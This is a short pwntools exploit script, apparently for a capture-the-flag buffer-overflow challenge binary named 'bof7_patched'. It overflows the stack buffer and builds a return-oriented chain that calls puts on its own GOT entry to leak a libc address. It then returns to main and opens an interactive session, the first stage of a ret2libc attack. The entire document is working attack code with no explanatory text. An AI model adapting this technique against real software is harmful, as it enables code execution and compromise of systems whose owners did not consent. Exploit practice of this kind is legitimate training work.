from pwn import *

exe = ELF('./bof7_patched')
r = process(exe.path)
libc = ELF('./libc6-amd64_2.31-0ubuntu9.1_i386.so')

pop_rdi = 0x0000000000401263

###Leak libc###
payload = b'a'*(0x50 + 0x8)
payload += p64(pop_rdi) + p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.sym['main'])
r.sendafter(b'Say something: ', payload)
put_leak = r.recv(6) + b'\0\0'
print(put_leak)

r.interactive()